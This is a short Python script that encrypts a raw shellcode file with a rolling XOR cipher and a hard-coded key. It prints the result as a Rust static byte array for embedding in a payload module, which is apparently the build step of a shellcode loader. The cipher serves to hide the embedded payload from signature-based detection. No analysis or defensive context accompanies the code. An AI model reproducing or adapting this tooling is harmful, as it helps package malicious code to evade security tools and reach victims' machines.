#!/usr/bin/env python3
"""Encrypt a raw shellcode blob for embedding in src/payload.rs."""

import sys


def encrypt(data: bytes, key: bytes) -> bytes:
    key = bytearray(key)
    out = bytearray(len(data))
    for i, p in enumerate(data):
        j = i % len(key)
        c = p ^ key[j] ^ (i & 0xFF)
        out[i] = c
        key[j] = ((key[j] << 3) | (key[j] >> 5)) & 0xFF ^ c  # rotl8(3) then xor
    return bytes(out)


def main() -> int:
    if len(sys.argv) != 2:
        print(__doc__)
        return 2
    key = bytes([0x37, 0x13, 0x42, 0x69, 0xF0, 0x0D, 0x42, 0x2A])
    with open(sys.argv[1], "rb") as fh:
        sc = fh.read()
    enc = encrypt(sc, key)
    print(f"pub static PAYLOAD_ENC: [u8; {len(enc)}] = [")
    for i in range(0, len(enc), 12):
        row = ", ".join(f"0x{b:02x}" for b in enc[i : i + 12])
        print(f"    {row},")
    print("];")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
